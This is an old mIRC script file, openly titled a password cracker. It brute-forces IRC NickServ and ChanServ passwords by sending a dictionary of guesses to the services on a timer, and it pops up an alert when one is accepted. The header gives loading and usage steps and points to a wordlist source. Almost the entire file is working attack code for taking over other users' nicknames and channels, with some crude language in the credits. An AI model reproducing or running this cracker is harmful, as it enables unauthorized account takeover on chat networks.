; ***************************************************************
; ** Password Cracker Addon                                    **
; ** By BEEFCAKE  <beefcake@thepentagon.com>                   ** 
; ** http://www.thepentagon.com/beefcake                       ** 
; ***************************************************************
;
; This is a brute forceing password cracker made for IRC
; You need a dicionary file that contains a list of possible
; passwords with one password on each line. If you do not
; have one go to http://www.antionline.com/archives/wordlists/
;
; To load this into mIRC type this
; /load -rs c:\path\to\crack.mrc
; into any window in mIRC
;
; To start it right click in the status window and make sure
; to set everything up then hit the start button and sit back.
;
; This file will keep guessing all the passwords in the list
; all you have to do is wait for a window that says
; NickServ/ChanServ PassWord Accepted and then look at the 
; cracking status and find which word it is.... guess what then you
; know the password :)
;
;
; Shout Outs to Transmitt,opiumeater, LoTuS-, and all the doods in
; #hackman on irc.dal.net


alias crack.nick {
  if (%crack.nick == $null) { /echo 4 -a *** No Nick was entered -- Halted | /.timer500 off | .timer503 off | /halt }
  if (%crack.line == $null) { /echo 4 -a *** No line was entered -- Halted | /.timer500 off | .timer503 off | /halt }
  if (%crack.dic == $null) { /echo 4 -a *** No dictionary file was entered -- Halted | /.timer500 off | /.timer503 off | /halt }
  if ($window(@PassCracker) == $null) { /window -a @PassCracker 0 500 500 79 | /titlebar @PassCracker NickServ Cracking Passwords tried these... %crack.line }
  /.msg nickserv identify %crack.nick $read -l $+ %crack.line %crack.dic 
  set %ncpass $read -l $+ %crack.line %crack.dic 
  titlebar @PassCracker NickServ Cracking Passwords tried these... %crack.line
  aline @PassCracker 5 $+ %ncpass
  /inc %crack.line 1
}

alias crack.chan {
  if (%crack.chan == $null) { /echo 4 -a *** No Nick was entered -- Halted | /.timer500 off | .timer503 off | /halt }
  if (%crack.line == $null) { /echo 4 -a *** No line was entered -- Halted | /.timer500 off | .timer503 off | /halt }
  if (%crack.dic == $null) { /echo 4 -a *** No dictionary file was entered -- Halted | /.timer500 off | .timer503 off | /halt }
  if ($window(@PassCracker) == $null) { /window -a @PassCracker 0 500 500 79 | /titlebar @PassCracker ChanServ Cracking Passwords tried these... %crack.line }
  /.msg chanserv identify %crack.chan $read -l $+ %crack.line %crack.dic 
  set %chpass $read -l $+ %crack.line %crack.dic 
  titlebar @PassCracker ChanServ Cracking Passwords tried these... %crack.line
  aline @PassCracker 5 $+ %chpass
  /inc %crack.line 1
}


menu Menubar {
  -
  Password Cracker
  .Nick Cracker
  ..Setup: 
  ...Set Nick: { set %crack.nick $$?="Nick To Crack" | /echo 4 -a *** %crack.nick has been set as the nickname to use for cracking. }
  ...Set Dic: { set %crack.dic $dir[="Select a dictionary file"] C:\ | /echo 4 -a *** %crack.dic has been set as the path to the Dict. file. }
  ...Set Line: { set %crack.line $$?="Line in dict. file to start on (1 is a good idea)" | /echo 4 -a *** %crack.line has been set as the line to start on. }
  ..Start: /.timer500 0 20 /crack.nick | /.timer503 0 60 /.ctcp $me ping | .enable #passhack on
  ..Stop: /.timer500 off | /echo 4 -a ***  You ended on line %crack.line incase u need to continue the crack later. | /unset %crack.nick | .disable #passhack end | .timer503 off
  ..-
  ..View What Pass your on:/echo 4 -a *** NickServ Cracking is on: %ncpass
  .Chan Cracker
  ..Setup: 
  ...Set Chan: { set %crack.chan $$?="Channel To Crack(remember the #)" | /echo 4 -a *** %crack.chan has been set as the channel to use for cracking. }
  ...Set Dic: { set %crack.dic $dir[="Select a dictionary file"] C:\ | /echo 4 -a *** %crack.dic has been set as the path to the Dict. file.  }
  ...Set Line: { set %crack.line $$?="Line in dict. file to start on (1 is a good idea)" | /echo 4 -a *** %crack.line has been set as the line to start on. }
  ..Start: /.timer501 0 20 /crack.chan | /.timer503 0 60 /.ctcp $me ping | .enable #passhack on
  ..Stop: /.timer501 off | /echo 4 -a ***  You ended on line %crack.line incase u need to continue the crack later. | /unset %crack.chan | .disable #passhack end | .timer503 off
  ..-
  ..View What Pass your on:/echo 4 -a *** ChanServ Cracking is on: %chpass
}

on 1:load {
  window -a @PassCracker 75 150 650 79 Fixedsys 9
  titlebar @PassCracker I guess this is the about....
  aline @PassCracker 10,1Password Cracker Enhanced By: abyss has been loaded.1,1aaaaaaaaaaaaaaaaaaaaaaƒƒƒƒ
  aline @PassCracker 10,1I'd like to say hey to opiumeater, Transmitt, LoTuS- (aka Infinite Virii), and #hackman on DalNet1,1aaaaaaaaaaƒƒƒ
  aline @PassCracker 9,1This Fuckin original piece of shit was made By: BEEFCAKE (just so you know)1,1aaaaƒƒƒ
  aline @PassCracker 8,1,This was re-edited by LoTuS (AkA Infinite Virii)  
  .auser 696969 NickServ
  .auser 696969 ChanServ
  .disable #passcrack end
}
on 1:load {
  window -a @PassCracker 75 150 650 79 Fixedsys 9
  titlebar @PassCracker I guess this is the about....
  aline @PassCracker 10,1Password Cracker Enhanced By: abyss, then LoTuS, has been loaded.1,1aaaaaaaaaaaaaaaaaaaaaaƒƒƒƒ
  aline @PassCracker 10,1I'd like to say hey to Transmitt, Loki, and Superman1,1aaaaaaaaaaƒƒƒ
  aline @PassCracker 9,1This Fuckin original piece of shit was made By: BEEFCAKE (just so you know)1,1aaaaƒƒƒ
  aline @PassCracker 8,1,This was re-edited by LoTuS (AkA Infinite Virii)  
}
#passhack on
on 696969:notice:*accepted*:*:{
  if ($nick == NickServ) goto npfound | elseif ($nick == ChanServ) goto cpfound | halt
  halt
  :npfound
  if ($window(@PassFound) == $null) { window -p @PassFound 150 150 500 79 } | else /clear @PassFound
  titlebar @PassFound NickServ Password Found
  drawtext -o @PassFound 4 Algerian 40 35 6 NickServ Password found!
  timer500 off
  timer503 off
  halt
  :cpfound
  if ($window(@PassFound) == $null) { window -p @PassFound 150 150 500 79 } | else /clear @PassFound
  titlebar @PassFound ChanServ Password Found
  drawtext -o @PassFound 4 Algerian 40 35 6 ChanServ Password found!
  timer501 off
  timer503 off
  halt
}
on 696969:notice:*Invalid*:*:halt
on 696969:notice:*Incorrect*:*:halt
#passhack end
